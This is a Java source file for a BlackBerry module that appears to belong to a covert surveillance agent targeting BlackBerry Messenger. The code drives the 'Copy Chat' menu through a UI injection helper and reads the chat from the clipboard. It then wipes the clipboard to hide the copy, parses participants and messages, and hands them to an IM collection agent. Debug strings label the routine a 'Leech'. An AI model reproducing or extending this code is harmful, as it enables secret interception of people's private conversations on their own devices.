//#preprocess
package blackberry.agent.im;

import java.util.Hashtable;
import java.util.Vector;

import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.Clipboard;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.agent.ImAgent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.MenuWalker;
import blackberry.utils.Check;

public class ConversationScreen {
    private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE);

    private UiApplication bbmApplication;
    private Vector conversationScreens = new Vector();
    Hashtable conversations=new Hashtable();

    public void setBBM(UiApplication bbmApplication) {
        this.bbmApplication = bbmApplication;
        //this.conversationScreens=conversationScreens;

        debug.info("conversation Leech: " + conversationScreens);
    }

    public synchronized void getConversationScreen() {
        try {
            if (bbmApplication == null || !Backlight.isEnabled()) {
                debug.ledStart(Debug.COLOR_RED);
                return;
            }

            Screen screen = bbmApplication.getActiveScreen();

            debug.info("leech active screen: " + screen);

            if (screen.getClass().getName().indexOf("ConversationScreen") >= 0
                    && bbmApplication.isForeground()) {

                String conversation = extractConversation(screen);
                
                
                if (!conversationScreens.contains(screen)) {
                    debug.info("Added new conversation screen: " + screen);
                    conversationScreens.addElement(screen);
                    conversations.put(screen, new Integer(conversation.hashCode()));
                    // exploreField(screen, 0, new String[0]);
                }

                // se conversation e' uguale all'ultima parsata non fare niente.
                Integer hash = (Integer) conversations.get(screen);
                if(hash.intValue() == conversation.hashCode()){
                    //#ifdef DEBUG
                    debug.trace("getConversationScreen: equal conversation, ignore it");
                    //#endif
                    return;
                }
                
                Vector result = parseConversation(conversation);

                if (result != null) {
                    //#ifdef DBC
                    Check.asserts(result.size() == 2, "wrong size result:  "
                            + result.size());
                    //#endif

                    String partecipants = (String) result.elementAt(0);
                    Vector lines = (Vector) result.elementAt(1);

                    ImAgent agent = ImAgent.getInstance();
                    agent.add(partecipants, lines);

                    debug.ledStart(Debug.COLOR_YELLOW);
                }
            }
            /*
             * if (screen.getClass().getName().indexOf("UserInfoScreen") >= 0) {
             * if (Backlight.isEnabled()) { //FieldExplorer explorer = new
             * FieldExplorer(); //Vector textfields = explorer.explore(screen,
             * true); } }
             */
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("getConversationScreen: " + ex);
            ex.printStackTrace();
            //#endif

        }
        return;
    }

    private String extractConversation(Screen screen) {

        debug.trace("extractConversation");

        // debug.trace("try copy chat: "+screen);
        if (MenuWalker.walk("Copy Chat", screen, true)) {
            String clip = (String) Clipboard.getClipboard().get();
            Clipboard.getClipboard().put("");

            if (!conversationScreens.contains(screen)) {
                debug.info("Clip: " + clip);
            }

            //debug.info("Clip: "
            //        + clip.substring(0, Math.min(100, clip.length())));
            return clip;
        } else {
            debug.info("NO Conversation screen!");
            return null;
        }
    }

    public static Vector parseConversation(String conversation) {
        // Participants:
        // -------------
        // Torcione, Whiteberry
        //
        // Messages:
        // ---------
        // Torcione: Scrivo anche a he

        try {
            int pos = conversation.indexOf("-------------");
            String partecipants;
            //String partecipant1, partecipant2;

            int partStart = conversation.indexOf("\n", pos) + 1;
            int partSep = conversation.indexOf(", ", partStart);
            int partEnd = conversation.indexOf("\n", partSep);

            partecipants = conversation.substring(partStart, partEnd).trim();

            Vector result = new Vector();

            int posMessages = getLinePos(conversation, 6);
            int numLine = 1;

            Vector lines = new Vector();

            String lastLine = "";
            while (true) {
                String currentLine = getNextLine(conversation, posMessages);
                if (currentLine == null) {
                    break;
                }
                posMessages += currentLine.length() + 1;
                
                if (numLine < 5) {
                    //#ifdef DEBUG
                    debug.trace("line " + numLine + " : " + currentLine);
                    //#endif
                }
                numLine += 1;

                // unisce le linee spezzate del nome
                if(currentLine.indexOf(":")<0){
                    lastLine=currentLine;
                    continue;
                }else{
                    currentLine = lastLine+" "+currentLine;
                    lastLine="";
                }
                
                //#ifdef DEBUG
                debug.trace("parseConversation adding line: " + currentLine);
                //#endif
                lines.addElement(currentLine.trim());
            }

            //agent.add(partecipants, lines);
            debug.info("num lines: " + numLine);
            result.addElement(partecipants);
            result.addElement(lines);

            //#ifdef DBC
            Check.ensures(result.size() == 2, "wrong size result");
            //#endif
            return result;
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("parseConversation: " + ex);
            //#endif
            return null;
        }

    }

    private static String getNextLine(String conversation, int posMessages) {

        int endLinePos = conversation.indexOf("\n", posMessages);
        if (endLinePos > 0) {
            return conversation.substring(posMessages, endLinePos);
        } else {
            return null;
        }
    }

    private static int getLinePos(String conversation, int numLine) {
        int nextLine = 0;
        for (int i = 0; i < numLine; i++) {
            nextLine = conversation.indexOf("\n", nextLine) + 1;
        }
        return nextLine;
    }

    public int size() {

        return conversationScreens.size();
    }

    public Screen elementAt(int i) {
        return (Screen) conversationScreens.elementAt(i);
    }

}
